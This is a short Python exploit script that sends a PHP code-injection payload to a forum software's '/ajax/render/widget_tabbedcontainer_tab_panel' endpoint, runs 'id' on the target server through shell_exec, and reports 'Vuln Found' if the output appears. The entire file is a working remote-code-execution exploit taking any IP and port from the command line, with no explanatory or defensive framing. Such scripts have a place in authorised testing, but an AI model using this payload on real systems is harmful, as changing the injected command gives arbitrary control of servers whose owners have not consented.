import re
import requests
import sys
import os

def exploit(dst_addr):
       URL="http://"+dst_addr+"/ajax/render/widget_tabbedcontainer_tab_panel"
       data ="subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec(\"id\"); exit;"
       res = requests.post(URL, data=data, verify=False)
       response = res.text

       p = re.compile('uid=\d')
       m = p.match(response)
       print("Status Code : %d"% res.status_code)
       if m:
               print("Vuln Found")
       else:
               print("Not Found")

if __name__ == "__main__":
       if len(sys.argv) == 2:
              sys.argv.append('80')
       elif len(sys.argv) < 3:
               print ('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
               sys.exit()
               
       address =(sys.argv[1], sys.argv[2])
       dst_addr=":".join(address)
       exploit(dst_addr)
